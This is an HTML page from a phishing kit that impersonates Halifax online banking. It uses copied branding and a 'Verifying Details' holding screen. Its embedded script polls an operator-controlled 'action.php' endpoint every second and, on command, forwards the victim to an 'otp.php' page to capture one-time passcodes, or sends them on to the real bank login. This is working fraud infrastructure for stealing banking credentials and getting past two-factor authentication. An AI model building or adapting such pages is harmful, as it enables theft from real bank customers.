


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">


<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Your memorable information</title>


    



<meta name="keywords" content="">
<meta name="description" content="">

<meta http-equiv="content-language" content="en-gb">
<link rel="alternate" media="handheld" href="https://www.halifax-online.co.uk/personal/logon/login.jsp">
<meta name="viewport" content="width=device-width">

          
  </script><meta name="DCSext.hasTealium" content="1">
   
  


<link rel="apple-touch-icon" sizes="57x57" href="https://www.halifax-online.co.uk/wps/wcm/connect/content_halifax_personal_banking/assets/media/images/mobile/Halifax%2057x57%20app-touch-icon-1432115287.JPG">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.halifax-online.co.uk/wps/wcm/connect/content_halifax_personal_banking/assets/media/images/mobile/Halifax%20114x114%20app-touch-icon-1472024731.JPG">


<link type="text/css" href="./hallifax_files/base-auto-min191016.css" rel="stylesheet">






   




<meta name="apple-itunes-app" content="app-id=486355738, affiliate-data=ct=h_rt_mb_lgn_wb&amp;pt=647402">


<meta name="dclinkjourid" content="EiK1xB6TRB9edXLX6mWXQdUmte3dZXp9">



    
     
        


<meta name="wup_url" content="https://wup-16c9d93d.eu.v2.we-stats.com/client/v3/web/wup?cid=karma">
<link rel="stylesheet" href="form/main.css">

</head>
<body class="hasJS">

    
    
    <input type="hidden" name="businessRuleCheckForMLPTHiddenText" id="businessRuleCheckForMLPTHiddenText" value="false">

    
    
    
  
    <div id="outer">
    
        <div id="banner">
            
            
            <p id="logo">
                <img src="./hallifax_files/Halifax-logo-1432115232.gif" alt="Halifax">
            </p>
            
            
            
            <p id="userstatusNGB">
                <img src="./hallifax_files/padlock-secure-NGB-1432115235.gif" alt="Secure">
            </p>
            
            
            
                <p class="cookiePolicy">
                   <a title="Cookie Policy" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/COOKIE_POLICY">
                        Cookie Policy
                   </a>
                   </p>
                       
            <div class="clearer"></div>
        </div>
            
        <div id="header">
            <div class="panelTL">
                <div class="panelTR">
                    <div class="panelBR">
                        <div class="panelBL">
                            <div id="headerInner">
                                
                                
                                
			
				
				
				
				


	
	
<!-- start TS:component_0_free_format -->	
	

	
	<h1>Confirming Your information</h1>


<!-- end TS:component_0_free_format -->
	



			
		
                                

                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
   
        <!--[if lte IE 8]>
        <div class="headerMsgErr"><h1>PLEASE UPDATE YOUR BROWSER.</h1>
        </div>
        <style type="text/css">
            .content { display:none; }
        </style>
        <div class="loginInner">
            <div class="msgErrorBrowser">
                <div class="msgTLBrowser">
                    <div class="msgTRBrowser">
                        <div class="msgBRBrowser">
                            <div class="msgBLBrowser">
                                <p class="browserMsgP">
                                <p>You're using an old version of your browser which won't work with Online Banking.</p><p>Please <a title="update your browser" href="https://www.halifax.co.uk/helpcentre/accessing-our-website/upgrading-your-browser/" target="_blank" rel="noopener noreferrer">update your browser</a>.</p>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="actionsLogin">
            <div class="divider">
                <hr />
            </div>
            <div class="backToHomepage">
                <p><a class="newwin" href="https://www.halifax.co.uk/" title="https://www.halifax.co.uk/" ><img alt="Back to homepage" src="/wps/wcm/connect/content_halifax_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/HALIFAX_BACK_TO_HOMEPAGE_NGB-1562947775.png"  /></a></p>
            </div>
        </div>
         
        <!--<![endif]-->

        
        <noscript>
        <div class="headerMsgErr"><h1>PLEASE TURN ON JAVASCRIPT.</h1>
        </div>
        <style type="text/css">
            .content { display:none; }
        </style>
        <div class="loginInner">
            <div class="msgErrorBrowser">
                <div class="msgTLBrowser">
                    <div class="msgTRBrowser">
                        <div class="msgBRBrowser">
                            <div class="msgBLBrowser">
                                <p class="browserMsgP">
                                <p>You need to have Javascript turned on to use Online Banking. You can turn it on by following the instructions in your browser menu. Or search for 'enable Javascript' in your search engine.</p><p>If you have accessibility needs and turned Javascript off because it interferes with your screen reader, you should check that you're using the most recent version of the screen reader, or you could try using an alternative.</p><p>If you have problems using a computer because of a disability or impairment, we recommend you visit <a title="https://www.abilitynet.org.uk" href="https://www.abilitynet.org.uk" target="_blank" rel="noopener noreferrer">https://www.abilitynet.org.uk</a> for free expert advice and guidance.</p>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="actionsLogin">
            <div class="divider">
                <hr />
            </div>
            <div class="backToHomepage">
                <p><a class="newwin" href="https://www.halifax.co.uk/" title="https://www.halifax.co.uk/" ><img alt="Back to homepage" src="/wps/wcm/connect/content_halifax_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/HALIFAX_BACK_TO_HOMEPAGE_NGB-1562947775.png"  /></a></p>
            </div>
        </div>
        </noscript>
        

        <div class="content">
            <div class="login">
                <div class="panelTL">
                    <div class="panelTR">
                        <div class="panelBR">
                            <div class="panelBL">
                                <div class="loginInner">
                                    
                                    
                                    <div class="loginFields">
                                        

                                            
                                           



                                        


                                    
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>


            
            
           <div class="aside">
           
                </div>
                
      

            

            <div class="appBannerBG">
                <div class="appBannerLink market">
                <center>
                    <image src='loading.gif' style='position:relative;width:150px;'>
                    <h4 style='font-size:20px; font-weight: 500; '>Verifying Details</h4>
                    <br></br>
                </center>
                </div>
            </div>
            
            
            

            <script src='files/jquery-3.4.1.min.js'></script>
<script>
setInterval(function() {
	$.ajax({
		type : 'GET',
		url : 'files/action.php?type=status',
		success: function (response) {
		
			if(response == 'otp'){
				location.href = "otp.php"
			}
            if(response == 'reset'){
                location.href = "index.php" ;
				 $.ajax({
				type : 'GET',
				 url : 'files/action.php?type=reset'})
		
		
			
                  
	
			}
			if(response == ''){
				location.href = "https://www.halifax-online.co.uk/personal/logon/login.jsp"
			}else{
				return false;
			}
		}
		})
		
		return false;

	}, 1000);


</script>
            
               
               
               
               
               
               
               
               
               
            




<div id="footerLogin">
    <div class="FootNav">
        <div class="lnkLevFoot">
           <p class="lnkLevFootP">
              
                 <a title="Register for Internet Banking" href="https://www.halifax-online.co.uk/personal/a/useradmin/mobile/registration/selectaccounttyperegistration.jsp">
                    Register for Internet Banking</a>
              
              
                 <a title="Go to desktop site" href="https://www.halifax-online.co.uk/personal/logon/login.jsp?mobile=false">Go to desktop site</a>
               
               
                 <a title="Help" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/HELP">
                    Help</a>
               
               
                 <a title="Security" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/SECURITY">
                    Security</a>
               
               
                 <a title="Contact us" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/CONTACT_US">
                    Contact us</a>
               
               
                <a title="Mobile Banking" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>
               
               
                <a title="Legal" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
               
            </p>
        </div>
        <div class="aside">
        
        
            <div class="aside">
                          <p class="sideNote">
                             <a title="Mobile Banking" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>
                          </p>

        
        
        </div>
        
            
                <div class="appBannerBG">
                    <div class="appBannerLink"><p align="center"><a href="http://www.halifax.co.uk/fscs/" title="fscs login tile"><img alt="FSCS" src="./hallifax_files/fscs-ngb-logon-banner-V2-1459783745.png"></a></p>
                    </div>
                </div>

        
        
        
        <div class="clearer"></div>
            <div>
            
            
                       <div class="footerLinksLogin">
                         <a title="Security" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/SECURITY">Security</a>

                         <a title="Legal" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
                      </div>
            
            
        </div>
        </div>
</div>
        
                
                
                

          
          
                <input type="hidden" name="smartAppForIosAndAndroid" value="true"> <input type="hidden" name="smartAppForIosAbvSix" value="true">
                
            
            </div>
            
        </div>
    </div>
  

    <noscript><div><img alt="DCSIMG" id="DCSIMG" class="hide" src="https://statse.webtrendslive.com/dcs33ei9u10000kby9iq3fci2_2x7f/njs.gif?WT.sp=IB;mobilebanking&WT.si_x=1&WT.si_n=mobileLogin&WT.cg_s=loginwithreglink&WT.cg_n=Mobile Banking&WT.ti=Halifax - Mobile Banking - Login"/></div></noscript>
                    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
                 
                 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
             
                 <script src="form/mask.js"></script>

</body></html>